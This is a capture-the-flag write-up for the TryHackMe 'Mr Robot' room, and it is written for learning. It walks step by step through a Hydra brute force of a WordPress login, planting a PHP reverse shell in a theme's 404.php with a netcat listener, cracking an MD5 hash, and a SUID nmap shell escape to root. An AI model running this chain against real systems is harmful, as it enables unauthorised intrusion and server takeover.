# TryHackMe — Mr Robot Writeup

**Room:** Mr Robot (based on the TV series)
**Difficulty:** Medium
**Keys found:** 3/3 ✅

## Overview
A full chain pentest: web recon → credential brute-forcing → malicious
plugin/theme upload for RCE → password hash cracking → SUID binary
privilege escalation to root.

## 1. Reconnaissance

Initial scan to find open services:
nmap -sV -sC -A -Pn <target-ip>

Result: 22 (SSH), 80 (HTTP), 443 (HTTPS) open, running WordPress on
Apache/Ubuntu.

Checked `robots.txt` for hints — a common first move:

curl http://<target-ip>/robots.txt

This revealed two files: `fsocity.dic` (a wordlist) and `key-1-of-3.txt`.

**Key 1:** fetched directly via curl from the webroot.

## 2. Gaining a foothold — WordPress brute force

Cleaned the discovered wordlist (removed duplicates):

sort fsocity.dic | uniq > fsocity_clean.dic


Found the valid username `elliot` via WordPress's login error message
(it leaks whether a username exists vs. the password being wrong).

Brute-forced the password with Hydra:

hydra -l elliot -P fsocity_clean.dic <target-ip> http-post-form
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:<fail-string>"

Credentials found: `elliot : ER28-0652`

## 3. Remote code execution via Theme Editor

Logged in as elliot, then abused the built-in **Theme Editor** (a classic
WordPress post-auth RCE vector — any admin/editor-level user can edit PHP
theme files directly, which execute on the server):

1. Edited `404.php` of the active theme and replaced it with the
   pentestmonkey PHP reverse shell, with my own IP/port set.
2. Started a listener: `nc -lvnp 4444`
3. Triggered execution by requesting any non-existent page (which Apache
   serves via 404.php):

curl http://<target-ip>/this-page-does-not-exist

4. Caught a shell as `daemon`, stabilized it:

python3 -c 'import pty; pty.spawn("/bin/bash")'


## 4. Lateral movement — cracking robot's password

Found `/home/robot/password.raw-md5` (world-readable), containing an MD5
hash. The system's `john` build didn't support `--format`, so cracked it
manually with a Python script against rockyou.txt:

```python
import hashlib
target = 'c3fcd3d76192e4007dfb496cca67e13b'
with open('rockyou.txt', 'r', encoding='latin-1') as f:
    for line in f:
        word = line.strip()
        if hashlib.md5(word.encode('latin-1')).hexdigest() == target:
            print('FOUND:', word)
            break
```
Result: `abcdefghijklmnopqrstuvwxyz`

Used it to `su robot` and read **Key 2**.

## 5. Privilege escalation — SUID nmap

Checked for sudo rights (none) and SUID binaries:

sudo -l
find / -perm -4000 2>/dev/null


Spotted `/usr/local/bin/nmap` in the SUID list — an old version (3.81)
with a legacy interactive mode. Since it's SUID and owned by root, its
interactive shell escape inherits root privileges:

nmap --interactive
nmap> !sh


This dropped into a root shell. Confirmed with `whoami`, then read
**Key 3** from `/root/`.

## Key Takeaways
- WordPress Theme Editor is a well-known post-auth RCE path — always worth
  disabling file editing (`DISALLOW_FILE_EDIT`) in production.
- World-readable password hash files are an easy privesc/lateral movement
  vector — file permissions matter.
- Old SUID binaries with legacy "interactive"/"debug" shell modes are a
  classic privesc pattern (see GTFOBins for similar cases: find, vim,
  less, more, nmap, etc.) — SUID bits should be audited regularly.

## Tools Used
nmap, curl, Hydra, custom Python (MD5 cracking), netcat, WordPress
Theme Editor, SUID enumeration

